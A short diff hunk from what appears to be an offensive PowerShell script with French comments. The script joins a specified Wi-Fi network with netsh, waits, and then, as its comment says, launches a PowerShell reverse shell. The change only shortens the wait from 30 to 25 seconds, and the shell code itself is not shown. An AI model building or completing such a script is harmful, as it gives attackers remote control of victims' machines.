@@ -45,7 +45,7 @@ netsh wlan add profile filename="$profilePath" > $null
 netsh wlan connect name="$SSID" > $null
 
 # Attend quelques secondes la connexion réseau
-Start-Sleep -Seconds 30
+Start-Sleep -Seconds 25
 
 # Lancement du reverse shell PowerShell
 try {
